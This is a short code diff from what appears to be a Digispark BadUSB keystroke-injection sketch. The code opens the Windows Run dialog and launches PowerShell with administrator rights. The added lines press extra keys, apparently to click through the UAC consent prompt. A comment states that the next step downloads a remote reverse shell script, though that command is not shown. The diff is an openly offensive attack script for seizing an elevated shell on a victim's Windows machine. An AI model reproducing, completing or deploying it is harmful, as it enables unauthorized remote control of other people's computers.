@@ -17,9 +17,14 @@ void loop(){
   DigiKeyboard.sendKeyStroke('r', KEY_LEFT_GUI);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("Run");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);  
   DigiKeyboard.delay(500);
   DigiKeyboard.print("PowerShell");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_LEFTARROW);
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
   DigiKeyboard.delay(500);
   //Open a powershell client and download remote reverse shell script
